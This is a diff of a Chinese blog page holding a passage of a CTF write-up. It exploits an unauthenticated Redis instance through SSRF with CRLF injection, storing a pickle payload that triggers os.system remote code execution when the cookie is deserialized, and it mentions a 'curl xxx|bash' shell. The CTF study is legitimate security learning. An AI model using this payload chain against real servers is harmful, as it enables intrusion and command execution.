class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># here put the import lib</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,email,username,password)</span>:</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = md5(password.encode(encoding=<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line">        self.phone = <span class="literal">None</span></span><br><span class="line">        self.qqnumber = <span class="literal">None</span></span><br><span class="line">        self.intro = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_pass</span><span class="params">(self,password)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> password <span class="keyword">and</span> md5(password.encode(encoding=<span class="string">'utf8'</span>)).hexdigest() == self.password:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modify_info</span><span class="params">(obj,dict)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">if</span> hasattr(obj,key) <span class="keyword">and</span> dict[key]!=<span class="string">''</span>:</span><br><span class="line">                setattr(obj,key,dict[key])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cookie</span><span class="params">(object)</span>:</span></span><br><span class="line">    __key = <span class="string">"abcd"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        __key = <span class="string">"abcd"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.mix_str = (self.username+Cookie.__key).encode(encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        self.md5_str = self.username+md5(self.mix_str).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> self.md5_str</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @create.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self,username)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(verify_cookie)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> verify_cookie:</span><br><span class="line">            username = verify_cookie[:<span class="number">-32</span>]</span><br><span class="line">            verify_str = verify_cookie[<span class="number">-32</span>:]</span><br><span class="line">            <span class="keyword">return</span> md5((username+Cookie.__key).encode(encoding=<span class="string">"utf8"</span>)).hexdigest()==verify_str</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">-*- coding: utf-8 -*-
 
+from hashlib import md5
+
+# here put the import lib
+class User(object):
+    def __init__(self,email,username,password):
+        self.email = email
+        self.username = username
+        self.password = md5(password.encode(encoding=&#39;utf8&#39;)).hexdigest()
+        self.phone = None
+        self.qqnumber = None
+        self.intro = None
+
+    def verify_pass(self,password):
+        if password and md5(password.encode(encoding=&#39;utf8&#39;)).hexdigest() == self.password:
+            return True
+        return None
+
+    @staticmethod
+    def modify_info(obj,dict):
+        for key in dict:
+            if hasattr(obj,key) and dict[key]!=&#39;&#39;:
+                setattr(obj,key,dict[key])
+
+
+
+class Cookie(object):
+    __key = &quot;abcd&quot;
+    def __init__(self):
+        __key = &quot;abcd&quot;
+
+    @property
+    def create(self):
+        self.mix_str = (self.username+Cookie.__key).encode(encoding=&quot;utf8&quot;)
+        self.md5_str = self.username+md5(self.mix_str).hexdigest()
+        return self.md5_str
+
+    @create.setter
+    def create(self,username):
+        self.username = username
+
+    @staticmethod
+    def verify(verify_cookie):
+        if verify_cookie:
+            username = verify_cookie[:-32]
+            verify_str = verify_cookie[-32:]
+            return md5((username+Cookie.__key).encode(encoding=&quot;utf8&quot;)).hexdigest()==verify_str
+        return None</code></pre>
 <p>这里主要得到两个信息。redis无密码。且是用来存储cookie的。而cookie的值会被调用出来进行pickle的反序列化。</p>
 <p>不用说，我们也大致明白思路了：操作redis修改cookie键对应的值。用cookie刷新触发反序列化RCE。<br>这个考点在去年的swpuctf的web2中也出现过。可惜自己因为环境问题一直没能在buu上做。</p>
 <p>这里基于源码比较齐全。我就本地简单搭建了一个server。然后触发一个生成cookie存储的过程。看看大致的存储规律<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>实际上就是以我们的cookie作为键，pickle的opcode作为值，比flask的默认存储直观很多。</p>
 <p>那么很简单了，我们生成下RCE代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">"__import__('os').system('echo `ls /` &gt; /tmp/byc')"</span>,))</span><br><span class="line">a = exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import pickle
+import urllib.parse
+
+class exp(object):
+    def __reduce__(self):
+        return (eval,(&quot;__import__(&#39;os&#39;).system(&#39;echo `ls /` &gt; /tmp/byc&#39;)&quot;,))
+a = exp()
+s=pickle.dumps(a)
+print(s)</code></pre>
 <p>这里为了不给服务器带来困扰，直接把根目录ls的结果写到tmp目录下，然后我们就能用读文件的途径直接读了。</p>
 <p>命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\x80\x03cbuiltins\neval\nq\x00X7\x00\x00\x00__import__(&#39;os&#39;).system(&#39;echo &#96;ls &#x2F;&#96; &gt; &#x2F;tmp&#x2F;byc4&#39;)q\x01\x85q\x02Rq\x03.&quot;%0d%0apadding</span><br></pre></td></tr></table></figure>
-<p>开始我在担心编码问题。后来发现应该不用在意。直接用python3的opcode结果就可以了。<br>刷新下cookie对应页面,然后读文件<code>file:///tmp/byc4</code><br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<pre><code>http://127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\x80\x03cbuiltins\neval\nq\x00X7\x00\x00\x00__import__(&#39;os&#39;).system(&#39;echo `ls /` &gt; /tmp/byc4&#39;)q\x01\x85q\x02Rq\x03.&quot;%0d%0apadding</code></pre><p>开始我在担心编码问题。后来发现应该不用在意。直接用python3的opcode结果就可以了。<br>刷新下cookie对应页面,然后读文件<code>file:///tmp/byc4</code><br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>接下来就可以直接读flag了。当然后面我试了下直接用<code>curl xxx|bash</code>弹个shell也是可以的。方法有很多。</p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>两道题都算是php与redis以及python与redis的经典搭配了。当然redis的利用还有很多，以后会慢慢学习。</p>
 <p>然后RCTF险些爆零……calc这题真的是太考验基本功了。做的人心累。</p>
@@ -742,7 +993,7 @@ c...</p>
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -754,9 +1005,9 @@ c...</p>
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -889,6 +1140,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1102,7 +1355,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1158,6 +1411,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
